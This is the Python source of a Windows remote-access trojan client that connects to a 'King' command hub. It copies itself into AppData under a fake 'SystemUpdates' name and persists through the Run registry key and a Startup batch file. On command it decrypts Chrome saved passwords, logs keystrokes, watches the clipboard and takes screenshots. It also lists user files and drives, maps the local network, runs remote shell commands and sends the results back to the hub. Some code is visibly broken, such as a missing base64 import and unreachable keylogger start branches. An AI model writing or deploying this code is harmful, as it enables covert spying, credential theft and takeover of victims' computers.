import os
import shutil
import sys
import argparse
import getpass
import json
import platform
import socket
import time
import ctypes
import winreg
import threading
import subprocess
import random
import uuid

def get_hwid():
    return "-".join(["{:02x}".format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)][::-1]).upper()

def get_arp_table():
    try:
        output = subprocess.check_output("arp -a", shell=True).decode('utf-8', errors='ignore')
        return output
    except Exception as e:
        return f"Failed to get ARP table: {e}"

def run_detached():
    if platform.system() == 'Windows':
        # Re-run the script with --detached flag to avoid recursion
        cmd = [sys.executable, sys.argv[0]] + sys.argv[1:] + ["--detached"]
        subprocess.Popen(cmd, creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
        sys.exit(0)

try:
    from mss import mss
    MSS_AVAILABLE = True
except ImportError:
    MSS_AVAILABLE = False
try:
    from PIL import Image
    PIL_AVAILABLE = True
except ImportError:
    PIL_AVAILABLE = False
try:
    import pyautogui
    PYAUTOGUI_AVAILABLE = True
except ImportError:
    pyautogui = None
    PYAUTOGUI_AVAILABLE = False
try:
    from pynput import keyboard
    PYNPUT_AVAILABLE = True
except ImportError:
    keyboard = None
    PYNPUT_AVAILABLE = False
try:
    import pyperclip
    PYPERCLIP_AVAILABLE = True
except ImportError:
    pyperclip = None
    PYPERCLIP_AVAILABLE = False
try:
    import sqlite3
    SQLITE_AVAILABLE = True
except ImportError:
    sqlite3 = None
    SQLITE_AVAILABLE = False
try:
    from Crypto.Cipher import AES
    from Crypto.Protocol.KDF import PBKDF2
    CRYPTO_AVAILABLE = True
except ImportError:
    AES = None
    PBKDF2 = None
    CRYPTO_AVAILABLE = False

# Global variables for keylogger and clipboard
keylog_active = False
keylog_data = ""
keylog_thread = None
clipboard_thread = None
clipboard_active = False
last_clipboard = ""

def extract_chrome_credentials():
    """Extract and decrypt Chrome saved passwords."""
    if not SQLITE_AVAILABLE or not CRYPTO_AVAILABLE:
        return "Required libraries not available: sqlite3 or pycryptodome"

    user_profile = os.getenv('USERPROFILE')
    chrome_path = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default')
    login_data = os.path.join(chrome_path, 'Login Data')
    local_state = os.path.join(user_profile, 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')

    if not os.path.exists(login_data) or not os.path.exists(local_state):
        return "Chrome data files not found"

    # Get master key from Local State
    with open(local_state, 'r', encoding='utf-8') as f:
        local_state_data = json.load(f)

    encrypted_key = base64.b64decode(local_state_data['os_crypt']['encrypted_key'])
    encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix

    # Decrypt master key using DPAPI
    try:
        master_key = ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(ctypes.c_buffer(encrypted_key)), None, None, None, None, 0, ctypes.byref(ctypes.c_void_p()))
        master_key = ctypes.string_at(master_key.contents.pbData, master_key.contents.cbData)
    except:
        return "Failed to decrypt master key"

    # Connect to Login Data
    conn = sqlite3.connect(login_data)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

    credentials = []
    for row in cursor.fetchall():
        url, username, encrypted_password = row
        if encrypted_password.startswith(b'v10'):
            # AES-GCM decryption
            nonce = encrypted_password[3:15]
            ciphertext = encrypted_password[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            try:
                password = cipher.decrypt(ciphertext)[:-16].decode('utf-8')  # Remove auth tag
                credentials.append(f"URL: {url}\nUsername: {username}\nPassword: {password}\n---\n")
            except:
                pass

    conn.close()
    return "\n".join(credentials) if credentials else "No credentials found"

def start_keylogger():
    """Start the keylogger thread."""
    global keylog_active, keylog_thread
    if not PYNPUT_AVAILABLE:
        return "pynput not available"

    if keylog_active:
        return "Keylogger already active"

    keylog_active = True
    keylog_data = ""

    def on_press(key):
        global keylog_data
        try:
            keylog_data += key.char
        except AttributeError:
            if key == keyboard.Key.space:
                keylog_data += " "
            elif key == keyboard.Key.enter:
                keylog_data += "\n"
            elif key == keyboard.Key.tab:
                keylog_data += "\t"
            else:
                keylog_data += f"[{key}]"

    listener = keyboard.Listener(on_press=on_press)
    keylog_thread = threading.Thread(target=listener.start, daemon=True)
    keylog_thread.start()
    return "Keylogger started"

def stop_keylogger():
    """Stop the keylogger."""
    global keylog_active
    keylog_active = False
    if keylog_thread:
        keylog_thread.join(timeout=1.0)
    return "Keylogger stopped"

def get_keylog():
    """Get the current keylog data."""
    return keylog_data

def start_clipboard_monitor():
    """Start clipboard monitoring thread."""
    global clipboard_active, clipboard_thread, last_clipboard
    if not PYPERCLIP_AVAILABLE:
        return "pyperclip not available"

    if clipboard_active:
        return "Clipboard monitor already active"

    clipboard_active = True
    last_clipboard = pyperclip.paste() if pyperclip else ""

    def monitor_clipboard():
        global last_clipboard
        while clipboard_active:
            try:
                current = pyperclip.paste()
                if current != last_clipboard:
                    last_clipboard = current
                    # Send to hub if connected, but for now, just log
                    print(f"[*] Clipboard changed: {current[:100]}...")
            except:
                pass
            time.sleep(1)

    clipboard_thread = threading.Thread(target=monitor_clipboard, daemon=True)
    clipboard_thread.start()
    return "Clipboard monitor started"

def stop_clipboard_monitor():
    """Stop clipboard monitoring."""
    global clipboard_active
    clipboard_active = False
    if clipboard_thread:
        clipboard_thread.join(timeout=1.0)
    return "Clipboard monitor stopped"

def capture_desktop_screenshot(client: socket.socket) -> None:
    """Capture primary monitor and send as PNG byte stream to server."""
    if not MSS_AVAILABLE or not PIL_AVAILABLE:
        error_msg = "DEPENDENCY_MISSING: mss Pillow\n"
        client.sendall(error_msg.encode())
        print("[!] Desktop capture failed: mss or PIL not available")
        return
    
    try:
        with mss() as sct:
            # Capture the primary monitor (index 1, as 0 is the virtual screen)
            monitor = sct.monitors[1]
            screenshot = sct.grab(monitor)
            
            # Convert mss screenshot to PIL Image
            image = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            
            # Save as compressed JPEG bytes at 60% quality
            import io
            jpg_buffer = io.BytesIO()
            image.save(jpg_buffer, format='JPEG', quality=60, optimize=True)
            jpg_data = jpg_buffer.getvalue()
            
            # Send compressed JPEG data with 10-byte fixed-length header
            client.sendall(b"IMG_FIXED\n")
            header = f"{len(jpg_data):010d}".encode('utf-8')
            client.sendall(header + jpg_data)
            print(f"[+] Desktop screenshot captured and sent ({len(jpg_data)} bytes)")
    except Exception as e:
        error_msg = f"DEPENDENCY_MISSING: mss Pillow\n" if not MSS_AVAILABLE or not PIL_AVAILABLE else str(e)
        try:
            client.sendall(error_msg.encode('utf-8'))
        except Exception:
            pass
        print(f"[-] Desktop capture failed: {e}")

def ensure_service_continuity() -> None:
    """Ensure script is registered in Windows Run registry key for persistence."""
    try:
        target_file = os.path.join(os.getenv('APPDATA'), 'SystemUpdates', 'win_manager.py')
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, 
            r'Software\Microsoft\Windows\CurrentVersion\Run', 
            0, 
            winreg.KEY_SET_VALUE
        )
        expected_value = f'pythonw "{target_file}"'
        
        try:
            current_value, _ = winreg.QueryValueEx(key, 'WinManager')
            if current_value != expected_value:
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
                print("[*] Service continuity key updated in registry.")
        except FileNotFoundError:
            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected_value)
            print("[*] Service continuity key created in registry.")
        finally:
            winreg.CloseKey(key)
    except Exception as e:
        print(f"[-] Service continuity setup failed: {e}")

def establish_persistence():
    """Copies the script to the local drive and adds it to Windows Startup."""
    try:
        # 1. Define paths (Hidden in AppData)
        app_data = os.getenv('APPDATA')
        target_dir = os.path.join(app_data, 'SystemUpdates')
        target_file = os.path.join(target_dir, 'win_manager.py')

        # 2. Create the hidden folder if it doesn't exist
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        # 3. Copy itself from USB to the Laptop's internal drive
        # sys.argv[0] is the current location of this script (e.g., the USB)
        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
            shutil.copy(sys.argv[0], target_file)
            print(f"[*] Payload migrated to: {target_file}")
        
        # 4. Create the Startup trigger (.bat file)
        startup_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, "ServiceUpdate.bat")
        
        # Only write the bat file if it doesn't exist to avoid constant overwriting
        if not os.path.exists(bat_path):
            with open(bat_path, "w") as f:
                # Use 'pythonw' if you want it to be invisible, or 'python' for testing
                f.write(f'@echo off\npythonw "{target_file}"')
            print("[*] Persistence established in Startup folder.")
    except Exception as e:
        print(f"[-] Persistence failed: {e}")
        return target_file

    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
        winreg.CloseKey(key)
        print("[*] Registry persistence added.")
    except Exception as e:
        print(f"[-] Registry persistence failed: {e}")
    return target_file

def check_persistence(target_file):
    while True:
        try:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_READ)
            value, _ = winreg.QueryValueEx(key, 'WinManager')
            winreg.CloseKey(key)
            expected = f'pythonw "{target_file}"'
            if value != expected:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, expected)
                winreg.CloseKey(key)
                print("[*] Persistence key corrected.")
        except FileNotFoundError:
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, 'WinManager', 0, winreg.REG_SZ, f'pythonw "{target_file}"')
            winreg.CloseKey(key)
            print("[*] Persistence key restored.")
        except Exception as e:
            print(f"[-] Persistence check failed: {e}")
        time.sleep(300)

def explore_drives():
    kernel32 = ctypes.windll.kernel32
    GetDriveType = kernel32.GetDriveTypeW
    DRIVE_FIXED = 3
    DRIVE_REMOVABLE = 2
    drives = {}
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        path = f'{letter}:\\'
        if os.path.exists(path):
            type_code = GetDriveType(path)
            if type_code == DRIVE_FIXED:
                if letter == 'C':
                    type_str = 'system'
                else:
                    type_str = 'secondary'
            elif type_code == DRIVE_REMOVABLE:
                type_str = 'mobile'
            else:
                continue
            try:
                dirs = list_dirs(path, max_depth=3)
                drives[letter] = {'type': type_str, 'dirs': dirs}
            except Exception as e:
                print(f"[-] Failed to explore {letter}: {e}")
    return drives

def list_dirs(path, depth=0, max_depth=3):
    result = []
    if depth >= max_depth:
        return result
    try:
        for item in os.listdir(path):
            full = os.path.join(path, item)
            if os.path.isdir(full):
                result.append(full)
                result.extend(list_dirs(full, depth+1, max_depth))
    except (PermissionError, OSError):
        pass
    return result

def harvest_user():
    userprofile = os.getenv('USERPROFILE')
    targets = ['Documents', 'Desktop', 'Downloads']
    result = {}
    for target in targets:
        path = os.path.join(userprofile, target)
        if os.path.exists(path):
            result[target] = []
            try:
                for root, dirs, files in os.walk(path):
                    for file in files:
                        result[target].append(os.path.join(root, file))
            except (PermissionError, OSError):
                pass
    return result

def get_username() -> str:
    try:
        return os.getlogin()
    except OSError:
        return getpass.getuser()

def report_status() -> str:
    info = {
        'HWID': get_hwid(),
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': get_username(),
        'Python': platform.python_version(),
    }
    try:
        import psutil
        uptime_seconds = time.time() - psutil.boot_time()
        info['Uptime'] = f'{uptime_seconds:.2f}s'
        info['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
        info['Memory'] = f'{psutil.virtual_memory().percent}% used'
    except ImportError:
        info['Uptime'] = 'N/A (psutil not installed)'
    return json.dumps(info)

def _print_node_banner(hub_ip: str, port: int) -> None:
    print("""
============================================================
 Agent Node Client
------------------------------------------------------------
""")
    print(f"Hub IP:    {hub_ip}")
    print(f"Hub Port:  {port}")
    print(f"Python:    {platform.python_version()}")
    print(f"Platform:  {platform.system()} {platform.release()}")
    print(f"MSS:       {'available' if MSS_AVAILABLE else 'missing'}")
    print(f"PIL:       {'available' if PIL_AVAILABLE else 'missing'}")
    print("============================================================\n")


def _print_node_banner(hub_ip: str, port: int) -> None:
    print("""
============================================================
 Agent Node Client
------------------------------------------------------------
""")
    print(f"Hub IP:    {hub_ip}")
    print(f"Hub Port:  {port}")
    print(f"Python:    {platform.python_version()}")
    print(f"Platform:  {platform.system()} {platform.release()}")
    print(f"MSS:       {'available' if MSS_AVAILABLE else 'missing'}")
    print(f"PIL:       {'available' if PIL_AVAILABLE else 'missing'}")
    print("============================================================\n")


def connect_to_hub(hub_ip: str, port: int) -> None:
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10.0)

        try:
            print(f"[*] Attempting to reach King at {hub_ip}...")
            client.connect((hub_ip, port))
            print(f"[*] SUCCESS: Connected to Command Hub.")

            while True:
                try:
                    data = client.recv(4096).decode('utf-8', errors='ignore')
                except socket.timeout:
                    continue

                if not data:
                    print("[-] Connection closed by hub")
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command: continue

                    if command == 'STATUS_REPORT':
                        report = report_status()
                        client.sendall(f'STATUS:{report}\n'.encode('utf-8'))
                    elif command == 'DESKTOP_CAPTURE':
                        capture_desktop_screenshot(client)
                    elif command == 'ENSURE_SERVICE_CONTINUITY':
                        ensure_service_continuity()
                        client.sendall(b'SERVICE_CONTINUITY_OK\n')
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received.')
                        return
                    elif command == 'PING':
                        client.sendall(b'PING_OK\n')
                    elif command.startswith('MESSAGE '):
                        # Extract the message text after "MESSAGE "
                        message_text = command[8:].strip('"')
                        try:
                            # Display system-level popup using Windows API
                            ctypes.windll.user32.MessageBoxW(0, message_text, "Message from King", 0x40)  # MB_ICONINFORMATION
                            print(f'[+] Displayed popup: "{message_text}"')
                        except Exception as e:
                            print(f'[-] Failed to display popup: {e}')
                    elif command.startswith('SHELL '):
                        # Extract the shell command after "SHELL "
                        shell_cmd = command[6:].strip('"')
                        try:
                            # Run the command and capture output
                            result = subprocess.check_output(shell_cmd, shell=True, stderr=subprocess.STDOUT, timeout=30)
                            output = result.decode('utf-8', errors='ignore').strip()
                            # Send the output back to the hub
                            json_output = json.dumps({'command': shell_cmd, 'output': output})
                            client.send(f"SHELL_SIZE {len(json_output)}\n".encode())
                            client.sendall(json_output.encode())
                            print(f'[+] Executed shell command: {shell_cmd}')
                        except subprocess.TimeoutExpired:
                            error_msg = json.dumps({'command': shell_cmd, 'error': 'Command timed out after 30 seconds'})
                            client.send(f"SHELL_SIZE {len(error_msg)}\n".encode())
                            client.sendall(error_msg.encode())
                            print(f'[-] Shell command timed out: {shell_cmd}')
                        except subprocess.CalledProcessError as e:
                            error_output = e.output.decode('utf-8', errors='ignore').strip()
                            error_msg = json.dumps({'command': shell_cmd, 'error': f'Exit code {e.returncode}', 'output': error_output})
                            client.send(f"SHELL_SIZE {len(error_msg)}\n".encode())
                            client.sendall(error_msg.encode())
                            print(f'[-] Shell command failed: {shell_cmd} (exit code {e.returncode})')
                        except Exception as e:
                            error_msg = json.dumps({'command': shell_cmd, 'error': str(e)})
                            client.send(f"SHELL_SIZE {len(error_msg)}\n".encode())
                            client.sendall(error_msg.encode())
                            print(f'[-] Shell command error: {e}')
                    elif command == 'KILL_AGENT':
                        print('[*] KILL_AGENT command received. Terminating and cleaning up...')
                        try:
                            # Remove registry key
                            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0, winreg.KEY_SET_VALUE)
                            winreg.DeleteValue(key, 'WinManager')
                            winreg.CloseKey(key)
                            print('[+] Registry key removed')
                        except Exception as e:
                            print(f'[-] Failed to remove registry key: {e}')
                        
                        try:
                            # Remove startup batch file
                            startup_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                            bat_path = os.path.join(startup_folder, "ServiceUpdate.bat")
                            if os.path.exists(bat_path):
                                os.remove(bat_path)
                                print('[+] Startup batch file removed')
                        except Exception as e:
                            print(f'[-] Failed to remove startup file: {e}')
                        
                        try:
                            # Remove the copied script
                            app_data = os.getenv('APPDATA')
                            target_file = os.path.join(app_data, 'SystemUpdates', 'win_manager.py')
                            if os.path.exists(target_file):
                                os.remove(target_file)
                                print('[+] Agent file removed')
                        except Exception as e:
                            print(f'[-] Failed to remove agent file: {e}')
                        
                        print('[*] Agent terminated and traces removed.')
                        return
                    elif command == 'EXPLORE_DRIVES':
                        try:
                            report = explore_drives()
                            json_report = json.dumps(report)
                            client.send(f"EXPLORE_SIZE {len(json_report)}\n".encode())
                            client.sendall(json_report.encode())
                        except Exception as e:
                            print(f"[-] EXPLORE_DRIVES failed: {e}")
                    elif command == 'HARVEST_USER':
                        try:
                            report = harvest_user()
                            json_report = json.dumps(report)
                            client.send(f"HARVEST_SIZE {len(json_report)}\n".encode())
                            client.sendall(json_report.encode())
                        except Exception as e:
                            print(f"[-] HARVEST_USER failed: {e}")
                    elif command == 'NETWORK_TOPOLOGY':
                        try:
                            arp_table = get_arp_table()
                            client.send(f"TOPOLOGY_SIZE {len(arp_table)}\n".encode())
                            client.sendall(arp_table.encode())
                        except Exception as e:
                            print(f"[-] NETWORK_TOPOLOGY failed: {e}")
                    elif command == 'EXTRACT_CREDENTIALS':
                        if not SQLITE_AVAILABLE or not CRYPTO_AVAILABLE:
                            client.sendall(b"DEPENDENCY_MISSING: sqlite3 pycryptodome\n")
                            continue
                        try:
                            creds = extract_chrome_credentials()
                            client.send(f"CRED_SIZE {len(creds)}\n".encode())
                            client.sendall(creds.encode())
                        except Exception as e:
                            error_msg = f"Failed to extract credentials: {e}"
                            client.send(f"CRED_SIZE {len(error_msg)}\n".encode())
                            client.sendall(error_msg.encode())
                    elif command == 'KEYLOG':
                        if not PYNPUT_AVAILABLE:
                            client.sendall(b"DEPENDENCY_MISSING: pynput\n")
                            continue
                        if 'START' in command.upper():
                            result = start_keylogger()
                        elif 'STOP' in command.upper():
                            result = stop_keylogger()
                        else:
                            result = "Use KEYLOG START or KEYLOG STOP"
                        client.sendall(f"KEYLOG_RESULT: {result}\n".encode())
                    elif command == 'GET_KEYS':
                        if not PYNPUT_AVAILABLE:
                            client.sendall(b"DEPENDENCY_MISSING: pynput\n")
                            continue
                        try:
                            log_data = get_keylog()
                            client.send(f"KEYLOG_SIZE {len(log_data)}\n".encode())
                            client.sendall(log_data.encode())
                        except Exception as e:
                            error_msg = f"Failed to get keylog: {e}"
                            client.send(f"KEYLOG_SIZE {len(error_msg)}\n".encode())
                            client.sendall(error_msg.encode())
                    elif command == 'CLIPBOARD':
                        if not PYPERCLIP_AVAILABLE:
                            client.sendall(b"DEPENDENCY_MISSING: pyperclip\n")
                            continue
                        if 'START' in command.upper():
                            result = start_clipboard_monitor()
                        elif 'STOP' in command.upper():
                            result = stop_clipboard_monitor()
                        else:
                            result = "Use CLIPBOARD START or CLIPBOARD STOP"
                        client.sendall(f"CLIPBOARD_RESULT: {result}\n".encode())
                    elif command.startswith('CLICK '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.sendall(b"DEPENDENCY_MISSING: pyautogui\n")
                            continue
                        try:
                            parts = command.split()
                            x = int(parts[1])
                            y = int(parts[2])
                            pyautogui.click(x, y)
                            print(f"[+] Clicked at ({x}, {y})")
                        except (ValueError, IndexError, Exception) as e:
                            print(f"[!] Invalid CLICK command or failed: {e}")
                    elif command.startswith('TYPE '):
                        if not PYAUTOGUI_AVAILABLE:
                            client.sendall(b"DEPENDENCY_MISSING: pyautogui\n")
                            continue
                        try:
                            text = command[5:].strip('"')
                            pyautogui.typewrite(text)
                            print(f"[+] Typed: {text}")
                        except Exception as e:
                            print(f"[!] Failed to type: {e}")
                    else:
                        print(f'[?] Received: {command}')
        
        except socket.error as e:
            # This catches Error 11001 and others
            print(f"[-] King is offline or Wi-Fi not ready (Error {e}).")
        except Exception as exc:
            print(f'[-] Unexpected Error: {exc}')
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            client.close()

        delay = random.randint(5, 15)  # Jitter for natural traffic pattern
        print(f'[*] Retrying in {delay} seconds...')
        time.sleep(delay)
        # Jitter: random delay between 5-15 seconds for natural traffic

def parse_args():
    parser = argparse.ArgumentParser(description='Node client for connecting to the King command hub')
    parser.add_argument('--hub-ip', default=os.getenv('KING_HUB_IP', '192.168.100.9'), help='IP address of the King command hub')
    parser.add_argument('--hub-port', type=int, default=int(os.getenv('KING_HUB_PORT', '9999')), help='Port of the King command hub')
    parser.add_argument('--no-persist', action='store_true', help='Do not establish persistence (for testing)')
    parser.add_argument('--detached', action='store_true', help='Run in background')
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()

    if not args.detached:
        print("[*] Transitioning to detached background process...")
        run_detached()

    # Initialize Persistence FIRST unless testing without persistence
    if not args.no_persist:
        target_file = establish_persistence()
        threading.Thread(target=check_persistence, args=(target_file,), daemon=True).start()
        # Ensure service continuity in registry
        ensure_service_continuity()
    else:
        print('[*] Running without persistence for testing.')

    _print_node_banner(args.hub_ip, args.hub_port)
    if args.hub_ip == '192.168.100.9':
        print('[*] WARNING: Using default HUB_IP 192.168.100.9. Update --hub-ip if King is on a different machine.')
    print(f'[*] Connecting to King at {args.hub_ip}:{args.hub_port}')
    connect_to_hub(args.hub_ip, args.hub_port)
